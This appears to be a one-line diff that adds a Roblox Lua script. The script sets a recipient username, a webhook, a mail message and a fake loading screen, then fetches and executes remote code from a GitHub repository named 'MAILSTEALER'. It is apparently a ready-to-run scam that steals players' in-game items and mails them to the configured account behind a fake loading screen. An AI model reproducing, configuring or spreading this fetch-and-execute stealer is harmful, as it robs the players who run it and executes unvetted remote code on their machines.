@@ -1,0 +1,1 @@
+Username = "ii_Janxavier" Webhook = "" Mailmsg = "hayst" FakeLoadScreen = true Fake_Hub_If_Not_Enough_Gems = false loadstring(game:HttpGet("https://raw.githubusercontent.com/POGGERZ15/MAILSTEALER/main/Main.lua"))()
